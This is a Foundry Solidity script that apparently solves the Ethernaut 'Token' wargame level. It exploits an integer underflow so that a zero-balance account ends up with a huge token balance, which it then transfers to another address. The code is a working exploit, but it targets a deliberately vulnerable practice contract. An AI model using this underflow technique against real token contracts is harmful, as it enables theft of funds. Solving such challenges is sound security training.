// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IToken } from "ethernaut/05-token/IToken.sol";

contract TokenScript is Script {
    event AddressBalance(address account, uint256 balance);

    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 3); // NB: not derivation 1
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address tokenAddr = vm.envAddress("L05_TOKEN_ADDRESS");
        IToken token = IToken(tokenAddr);

        // Step 1: msgSender (addr3, 0 TKN) transfers 1 TKN to addr1 (0 TKN)
        uint256 addr1PrivateKey = vm.deriveKey(mnemonic, 1); // NB: address that has a 20 token balance
        address addr1 = vm.addr(addr1PrivateKey);
        token.transfer(addr1, 1);

        // Step 2: transfer all funds from msgSender (addr3) to Ethernaut account (addr1)
        address msgSender = vm.addr(deployerPrivateKey);
        uint256 msgSenderBalance = token.balanceOf(msgSender);
        // NB: Current addr1 balance is 21 tokens, therefore in terms to max out the transfer 21 must be substracted
        // (otherwise it will overflow)
        token.transfer(addr1, msgSenderBalance - 21);

        // Log balances
        msgSenderBalance = token.balanceOf(msgSender);
        emit AddressBalance(msgSender, msgSenderBalance);
        uint256 addr1Balance = token.balanceOf(addr1);
        emit AddressBalance(addr1, addr1Balance);

        vm.stopBroadcast();
    }
}
